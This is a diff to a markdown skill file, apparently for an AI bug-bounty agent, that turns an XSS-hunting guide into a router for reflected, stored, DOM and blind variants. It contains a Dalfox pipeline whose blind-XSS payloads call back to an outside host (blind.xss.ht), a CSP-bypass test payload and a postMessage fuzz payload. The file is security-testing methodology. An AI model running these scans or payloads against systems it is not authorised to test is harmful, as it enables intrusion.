@@ -1,14 +1,18 @@
 ---
 name: attack-xss
-description: "Cross-site scripting — Dalfox automation, Wayback GF, CSP bypass, and postMessage XSS"
+description: "Cross-site scripting router — pick the variant sub-skill (reflective / stored / DOM / blind) first, then Dalfox automation, CSP bypass, postMessage XSS"
 category: "client-side"
-version: "1.0"
+version: "2.0"
 author: "bountyreper-official"
 tags:
   - xss
   - csp
   - dalfox
   - postmessage
+  - reflective
+  - stored
+  - dom
+  - blind
 tech_stack:
   - web
 cwe_ids:
@@ -21,27 +25,35 @@ prerequisites: []
 
 # XSS Hunting
 
-## Objective
+## Route first — load the variant sub-skill
 
-Find reflected, stored, and DOM XSS via automation and CSP/postMessage bypass.
+XSS has four genuinely different methodologies. Determine the variant from what you
+have observed, load that sub-skill, and work from it. Do not improvise payloads before
+the context is known — that is how XSS turns into false positives.
 
-> **Attribution:** Methodology from [KathanP19/HowToHunt — XSS](https://github.com/KathanP19/HowToHunt/tree/master/XSS) (5 files: Automated_XSS, Bypass_CSP, post_message, XSS_Bypass). Licensed GPL-3.0.
+| What you observed | Variant | Load |
+|---|---|---|
+| Input echoed in the same HTTP response | Reflected | `skill(action="load", name="attack-xss-reflective")` |
+| Input persisted, rendered for OTHER users/admins | Stored | `skill(action="load", name="attack-xss-stored")` |
+| No server reflection; payload reaches a JS sink (hash, postMessage, JSON→HTML) | DOM | `skill(action="load", name="attack-xss-dom")` |
+| No idea where it renders (admin queues, staff reviews) | Blind | `skill(action="load", name="attack-xss-blind")` |
 
-## Testing Methodology
+Sub-skill files: `reflective`, `stored`, `dom`, `blind` (under `attack-xss/`).
+
+## Cross-cutting automation (use with any variant)
 
 ### Automation (Dalfox + Wayback + GF)
 
 ```bash
 waybackurls target.com | gf xss | sed 's/=.*/=/' | sort -u > possible.txt
 cat possible.txt | dalfox pipe --skip-bav -b blind.xss.ht
-# Blind XSS
+# Blind XSS sweep
 waybackurls target.com | gf xss | dalfox -b blind.xss.ht pipe
 ```
 
 ### CSP Bypass
 
 ```bash
-# Check CSP header
 curl -s -D- https://target.com | grep -i content-security-policy
 # If unsafe-inline or data: allowed, XSS possible
 # Test with: <script src=data:text/javascript,alert(1)>
@@ -50,10 +62,17 @@ curl -s -D- https://target.com | grep -i content-security-policy
 ### postMessage XSS
 
 ```js
-// In browser console, test postMessage listener
 window.addEventListener('message', e => console.log(e.data))
-// Fuzz with: window.postMessage("<img src=x onerror=alert(1)>", "*")
+// Fuzz: window.postMessage("<img src=x onerror=alert(1)>", "*")
 ```
+
+Delivering via postMessage lands in DOM sinks → work from attack-xss-dom.
+
+## Evidence rule (all variants)
+
+Reflection or storage alone is CANDIDATE evidence. Confirmed requires the observed
+execution: headless browser alert/console capture, or an OOB callback (interactsh /
+Burp Collaborator) from the payload. No execution proof → the report is capped.
 
 ## References
 
